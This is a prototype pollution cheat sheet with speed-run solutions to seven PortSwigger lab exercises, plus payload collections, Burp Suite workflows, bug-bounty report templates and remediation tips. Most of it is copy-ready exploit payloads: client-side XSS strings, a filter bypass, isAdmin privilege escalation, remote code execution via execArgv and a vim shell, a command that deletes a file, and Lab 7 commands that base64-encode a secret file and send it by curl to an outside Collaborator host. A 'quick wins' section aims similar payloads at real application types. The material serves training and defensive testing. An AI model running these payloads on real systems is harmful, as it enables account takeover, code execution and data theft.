# Prototype Pollution Quick Start Guide

## 60-Second Vulnerability Check

### Client-Side Quick Test
```javascript
// 1. Add to URL
?__proto__[test]=vulnerable

// 2. Open Console (F12)
Object.prototype

// 3. Look for "test: vulnerable"
// If present = VULNERABLE ✅
```

### Server-Side Quick Test
```bash
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'

# Check response for increased indentation = VULNERABLE ✅
```

---

## Lab Speed-Run Guides

### Lab 1: DOM XSS via Client-Side PP (10 min)

**Quick Steps:**
1. Navigate to lab
2. Add to URL: `/?__proto__[foo]=bar`
3. Console (F12): Check `Object.prototype.foo` → confirms pollution
4. Sources tab → Find `searchLogger.js`
5. Identify `config.transport_url` used in `script.src`
6. Exploit: `/?__proto__[transport_url]=data:,alert(1);`
7. Lab solved! ✅

**Faster with DOM Invader (2 min):**
1. Enable DOM Invader → Reload
2. Click "Scan for gadgets"
3. Click "Exploit" → Done! ✅

---

### Lab 2: PP via Browser APIs (15 min)

**Quick Steps:**
1. Test pollution: `/?__proto__[foo]=bar`
2. Console: Verify `Object.prototype.foo`
3. Sources → `searchLoggerConfigurable.js`
4. Find `Object.defineProperty()` with missing `value`
5. Exploit: `/?__proto__[value]=data:,alert(1);`
6. Lab solved! ✅

**Key Insight:** Poll

ute `value` property, not `transport_url`

---

### Lab 3: PP via Flawed Sanitization (15 min)

**Quick Steps:**
1. Test: `/?__proto__[foo]=bar` → Blocked
2. Sources → Find non-recursive filter
3. Bypass: `/?__pro__proto__to__[foo]=bar`
4. Console: Verify pollution
5. Find gadget in `searchLogger.js`: `transport_url`
6. Exploit: `/?__pro__proto__to__[transport_url]=data:,alert(1);`
7. Lab solved! ✅

**Bypass Pattern:** Nest blocked string within itself

---

### Lab 4: PP in Third-Party Libraries (5 min with DOM Invader)

**Quick Steps:**
1. Enable DOM Invader
2. Reload page
3. Click "Scan for gadgets"
4. Select `hitCallback` gadget
5. Click "Exploit"
6. Go to exploit server
7. Body: `<script>location='https://LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)';</script>`
8. "Deliver exploit to victim"
9. Lab solved! ✅

**Manual (20 min):** Test `#__proto__[foo]=bar` → Find `hitCallback` in minified code → Exploit

---

### Lab 5: Privilege Escalation via Server-Side PP (15 min)

**Quick Steps:**
1. Login: `wiener:peter`
2. Update address → Burp history
3. Send `POST /my-account/change-address` to Repeater
4. Test: `"__proto__": {"foo":"bar"}`
5. Response shows `foo` → Pollution confirmed
6. Identify gadget: `isAdmin: false` in response
7. Exploit: `"__proto__": {"isAdmin":true}`
8. Browser: Refresh page → Admin panel appears
9. Delete user "carlos"
10. Lab solved! ✅

**Key Property:** `isAdmin`

---

### Lab 6: RCE via Server-Side PP (25 min)

**Quick Steps:**
1. Login: `wiener:peter`
2. Update address → Burp Repeater
3. Test: `"__proto__": {"json spaces": 10}`
4. Response indentation confirms pollution
5. Admin panel → "Run maintenance jobs" (gadget trigger)
6. Burp Collaborator → Copy domain
7. Test RCE:
   ```json
   "__proto__": {
       "execArgv": ["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR.oastify.com')"]
   }
   ```
8. Send → Trigger maintenance jobs → Poll Collaborator → Callback confirms RCE
9. Exploit:
   ```json
   "__proto__": {
       "execArgv": ["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]
   }
   ```
10. Trigger maintenance jobs
11. Lab solved! ✅

**Critical:** Must trigger maintenance jobs after each payload

---

### Lab 7: Data Exfiltration via Server-Side PP (30 min)

**Quick Steps:**
1. Login: `wiener:peter`
2. Update address → Repeater
3. Test: `"__proto__": {"json spaces": 10}` → Confirms pollution
4. Burp Collaborator → Copy domain
5. Test RCE:
   ```json
   "__proto__": {
       "shell": "vim",
       "input": ":! curl https://YOUR-COLLABORATOR.oastify.com\n"
   }
   ```
6. Trigger maintenance jobs → Poll Collaborator → RCE confirmed
7. List directory:
   ```json
   "__proto__": {
       "shell": "vim",
       "input": ":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR.oastify.com\n"
   }
   ```
8. Poll Collaborator → Decode base64 → Find `secret` file
9. Exfiltrate:
   ```json
   "__proto__": {
       "shell": "vim",
       "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR.oastify.com\n"
   }
   ```
10. Poll Collaborator → Decode base64
11. Submit secret
12. Lab solved! ✅

**Key Technique:** Base64 encoding for safe exfiltration

---

## Common Exploitation Payloads

### Client-Side XSS

```javascript
// Basic detection
?__proto__[test]=vulnerable

// XSS via transport_url gadget
?__proto__[transport_url]=data:,alert(1);

// XSS via value property (Browser API bypass)
?__proto__[value]=data:,alert(document.domain);

// Sanitization bypass
?__pro__proto__to__[transport_url]=data:,alert(1);

// Hash-based exploitation
#__proto__[hitCallback]=alert(document.cookie)

// Constructor alternative
?constructor[prototype][transport_url]=data:,alert(1);
```

### Server-Side Privilege Escalation

```json
// Detection
{
    "data": "test",
    "__proto__": {
        "foo": "bar"
    }
}

// Privilege escalation
{
    "data": "test",
    "__proto__": {
        "isAdmin": true
    }
}

// Role manipulation
{
    "data": "test",
    "__proto__": {
        "role": "admin",
        "privilegeLevel": 999
    }
}
```

### Server-Side RCE

```json
// Non-destructive detection (JSON spaces)
{
    "data": "test",
    "__proto__": {
        "json spaces": 10
    }
}

// RCE via execArgv (most common)
{
    "data": "test",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('COMMAND')"
        ]
    }
}

// RCE via vim shell
{
    "data": "test",
    "__proto__": {
        "shell": "vim",
        "input": ":! COMMAND\n"
    }
}

// Status code detection
{
    "data": "test",
    "__proto__": {
        "status": 555
    }
}
```

---

## Burp Suite Speed Tips

### Essential Shortcuts

| Action | Shortcut |
|--------|----------|
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Open DOM Invader | `Ctrl+Shift+I` |
| Scan for gadgets | `Ctrl+Shift+G` |
| Open Collaborator | `Ctrl+Shift+C` |
| Pretty print JSON | `Ctrl+Shift+B` |
| Go to tab | `Ctrl+1-9` |

### DOM Invader Workflow

1. **Setup (30 seconds):**
   - Burp → Built-in browser
   - DOM Invader → Settings
   - Enable "Prototype pollution"
   - Check "Scan for gadgets automatically"

2. **Testing (1 minute):**
   - Navigate to target
   - DOM Invader auto-detects sources
   - Click "Scan for gadgets"
   - Select exploit → Click "Exploit"

3. **Benefits:**
   - Automatic source detection
   - Gadget chain identification
   - One-click exploitation
   - Works with minified code

### Repeater Workflow for Server-Side

1. **Find vulnerable endpoint:**
   - Proxy → HTTP history
   - Look for JSON POST requests
   - Send to Repeater (`Ctrl+R`)

2. **Test pollution (2 minutes):**
   ```json
   {
       "legitimate": "data",
       "__proto__": {
           "json spaces": 10
       }
   }
   ```
   - Send (`Ctrl+Space` or click)
   - Check Raw response for indentation

3. **Identify gadgets (5 minutes):**
   - Look for boolean properties: `isAdmin`, `isAuthenticated`
   - Look for role/privilege properties
   - Test property reflection

4. **Exploit:**
   - Modify `__proto__` object
   - Send payload
   - Verify in browser

### Collaborator Workflow

1. **Setup:**
   - Burp menu → Burp Collaborator client
   - Click "Copy to clipboard"

2. **Usage in payloads:**
   ```json
   "__proto__": {
       "execArgv": ["--eval=require('child_process').execSync('curl https://YOUR-ID.oastify.com')"]
   }
   ```

3. **Check results:**
   - Collaborator client → "Poll now"
   - Look for DNS/HTTP interactions

---

## Testing Methodology Checklist

### Client-Side Testing (5 minutes)

- [ ] **Test query string:** `?__proto__[test]=value`
- [ ] **Test hash:** `#__proto__[test]=value`
- [ ] **Check console:** `Object.prototype`
- [ ] **Test constructor:** `?constructor[prototype][test]=value`
- [ ] **Use DOM Invader** for automatic detection
- [ ] **Scan for gadgets** with DOM Invader
- [ ] **Test exploit** with `data:,alert(1);`

### Server-Side Testing (10 minutes)

- [ ] **Identify JSON endpoints** in Proxy history
- [ ] **Test JSON spaces:** `"__proto__": {"json spaces": 10}`
- [ ] **Test status code:** `"__proto__": {"status": 555}`
- [ ] **Test property reflection:** `"__proto__": {"test": "value"}`
- [ ] **Check responses** for reflected properties
- [ ] **Look for boolean properties** (isAdmin, isAuth, etc.)
- [ ] **Test privilege escalation** by polling identified properties
- [ ] **Setup Collaborator** for RCE testing
- [ ] **Test RCE** with safe commands first (curl to Collaborator)
- [ ] **Identify gadget triggers** (admin actions, cron jobs, etc.)

---

## Common Mistakes & Quick Fixes

### Mistake 1: Not Checking Console
**Problem:** Assuming pollution failed without verification
**Fix:** Always open console and check `Object.prototype`

### Mistake 2: Forgetting URL Encoding
**Problem:** Special characters breaking exploits
**Fix:** Use Burp's "URL-encode as you type" or `Ctrl+U`

### Mistake 3: Not Triggering Gadgets
**Problem:** Payload sent but not executed (especially server-side)
**Fix:** Identify what triggers the gadget (page refresh, admin action, cron job)

### Mistake 4: Testing Production First
**Problem:** Causing DoS or breaking functionality
**Fix:** Always use non-destructive detection first (JSON spaces, property reflection)

### Mistake 5: Invalid JSON Syntax
**Problem:** Server rejecting malformed JSON
**Fix:** Use JSON validator or Burp's "Pretty" feature before sending

### Mistake 6: Not Using Burp Collaborator
**Problem:** Missing blind RCE confirmation
**Fix:** Always setup Collaborator for server-side testing

### Mistake 7: Cache Issues
**Problem:** Browser caching polluted prototype
**Fix:** Hard refresh (`Ctrl+Shift+R`) or use incognito mode

### Mistake 8: Wrong Property Names
**Problem:** Polluting properties that don't exist as gadgets
**Fix:** Analyze responses and code to identify actual gadget properties

---

## Speed Run Strategy

### All 7 Labs in 2 Hours

**Timing:**
- Lab 1 (Client-Side): 10 minutes
- Lab 2 (Browser APIs): 15 minutes
- Lab 3 (Sanitization): 15 minutes
- Lab 4 (Third-Party): 5 minutes (with DOM Invader)
- Lab 5 (Privilege Escalation): 15 minutes
- Lab 6 (RCE): 25 minutes
- Lab 7 (Data Exfiltration): 30 minutes
- **Buffer:** 5 minutes

**Optimization Tips:**
1. Use DOM Invader for all client-side labs (saves 50% time)
2. Keep Burp Repeater tabs organized
3. Have Collaborator ready before Lab 6
4. Copy/paste payloads from this guide
5. Use keyboard shortcuts exclusively

---

## Detection Commands

### Client-Side (Browser Console)

```javascript
// Quick detection
Object.prototype

// Programmatic check
(function() {
    const test = '__pptest_' + Math.random();
    window.location.search = '?__proto__[' + test + ']=1';
    setTimeout(() => {
        console.log(Object.prototype[test] ? 'VULNERABLE' : 'SAFE');
    }, 100);
})();
```

### Server-Side (cURL)

```bash
# JSON Spaces Detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "json spaces": 10
    }
  }' | grep -c "    "

# If count > 5, likely vulnerable

# Status Code Detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -w "\n%{http_code}\n" \
  -d '{
    "__proto__": {
      "status": 555
    }
  }'

# If status = 555, vulnerable

# Property Reflection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "pptest": "vulnerable"
    }
  }' | jq '.pptest'

# If output = "vulnerable", vulnerable
```

---

## Payload Encoding Reference

### URL Encoding

```
# Required for URL parameters
__proto__[test]=value
→ __proto__%5Btest%5D=value

# Data URL (already encoded)
data:,alert(1);
→ data:,alert(1);  # No encoding needed in URL params

# Special characters
< → %3C
> → %3E
" → %22
' → %27
( → %28
) → %29
```

### JSON Encoding

```json
// Correct JSON (no encoding needed)
{
    "__proto__": {
        "test": "value"
    }
}

// Escaping in JSON strings
{
    "__proto__": {
        "script": "<img src=x onerror=alert(1)>"
    }
}
```

### Base64 (for data exfiltration)

```bash
# Encode
echo "secret content" | base64
# Output: c2VjcmV0IGNvbnRlbnQK

# Decode
echo "c2VjcmV0IGNvbnRlbnQK" | base64 -d
# Output: secret content
```

---

## Quick Wins by Application Type

### E-Commerce / Account Systems
**Target:** `isAdmin`, `isPremium`, `discountRate`
```json
"__proto__": {
    "isAdmin": true,
    "isPremium": true,
    "discountRate": 1.0
}
```

### SaaS / Multi-Tenant
**Target:** `tenantId`, `organizationId`, `accessLevel`
```json
"__proto__": {
    "tenantId": "victim-tenant",
    "bypassIsolation": true
}
```

### API Gateways
**Target:** `rateLimit`, `authenticated`, `apiKey`
```json
"__proto__": {
    "authenticated": true,
    "rateLimit": false,
    "apiKey": "valid-key"
}
```

### CMS / Content Platforms
**Target:** `canEdit`, `canPublish`, `role`
```json
"__proto__": {
    "canEdit": true,
    "canPublish": true,
    "role": "editor"
}
```

---

## Bug Bounty 5-Minute Workflow

**Quick Recon (2 minutes):**
1. Identify JSON endpoints
2. Check query string parsing
3. Look for client-side JS that merges objects

**Test Detection (1 minute):**
```bash
# Client-side
curl "https://target.com/?__proto__[test]=1"
# Check console

# Server-side
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'
```

**Identify Impact (2 minutes):**
- Can you escalate privileges?
- Can you achieve XSS?
- Can you trigger RCE?
- What gadgets exist?

**Report Template:**
```markdown
## Prototype Pollution in [Endpoint]

**Severity:** High/Critical
**Type:** [Client-Side XSS / Server-Side RCE / Privilege Escalation]

### Proof of Concept

[Payload and steps]

### Impact

[Specific exploitation scenario]

### Remediation

- Sanitize property keys
- Use Object.create(null)
- Implement input validation
```

---

## Report Template

```markdown
# Prototype Pollution Vulnerability Report

## Executive Summary
A prototype pollution vulnerability was identified in [APPLICATION] that allows
[PRIVILEGE ESCALATION / XSS / RCE] via [ENDPOINT/PARAMETER].

## Technical Details

**Affected Endpoint:** [URL]
**HTTP Method:** [GET/POST]
**Parameter:** [NAME]

**Vulnerability Type:**
- [ ] Client-Side Prototype Pollution → XSS
- [ ] Server-Side Prototype Pollution → Privilege Escalation
- [ ] Server-Side Prototype Pollution → RCE

## Proof of Concept

### Detection
```
[Detection payload]
```

### Exploitation
```
[Exploitation payload]
```

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact Assessment

**Severity:** [Critical/High/Medium]
**CVSS Score:** [Score]
**Risk:** [Description]

**Potential Consequences:**
- [Impact 1]
- [Impact 2]
- [Impact 3]

## Affected Versions
- [Application version]
- [Framework version]
- [Library version]

## Remediation

**Immediate Actions:**
1. Implement property key sanitization
2. Use allowlist for accepted properties
3. Deploy input validation middleware

**Long-Term Solutions:**
1. Use Object.create(null) for configuration objects
2. Freeze Object.prototype
3. Regular dependency audits
4. Implement CSP headers

**Code Examples:**
```javascript
// Secure implementation
[Code]
```

## References
- [OWASP Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
- [PortSwigger Research](https://portswigger.net/research/server-side-prototype-pollution)

## Timeline
- **Discovered:** [Date]
- **Reported:** [Date]
- **Acknowledged:** [Date]
- **Fixed:** [Date]
```

---

## Resources

### Essential Links

**PortSwigger:**
- [Prototype Pollution Labs](https://portswigger.net/web-security/prototype-pollution)
- [Learning Path](https://portswigger.net/web-security/learning-paths/prototype-pollution)

**OWASP:**
- [Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

**Tools:**
- [DOM Invader Documentation](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [Burp Extensions](https://portswigger.net/bappstore)

**Research:**
- [Server-Side PP Research](https://portswigger.net/research/server-side-prototype-pollution)
- [Dasty Tool Paper](https://arxiv.org/abs/2311.03919)

---

## Quick Reference Table

| Lab | Difficulty | Time | Key Payload |
|-----|-----------|------|-------------|
| 1. DOM XSS | APPRENTICE | 10 min | `?__proto__[transport_url]=data:,alert(1);` |
| 2. Browser APIs | PRACTITIONER | 15 min | `?__proto__[value]=data:,alert(1);` |
| 3. Sanitization | PRACTITIONER | 15 min | `?__pro__proto__to__[transport_url]=data:,alert(1);` |
| 4. Third-Party | EXPERT | 5 min | `#__proto__[hitCallback]=alert(document.cookie)` |
| 5. Privilege Esc | PRACTITIONER | 15 min | `"__proto__": {"isAdmin":true}` |
| 6. RCE | EXPERT | 25 min | `"__proto__": {"execArgv":["--eval=CODE"]}` |
| 7. Exfiltration | EXPERT | 30 min | `"__proto__": {"shell":"vim","input":":! CMD\n"}` |

---

**Last Updated:** 2026-01-10
**Version:** 1.0 - Quick Start Edition
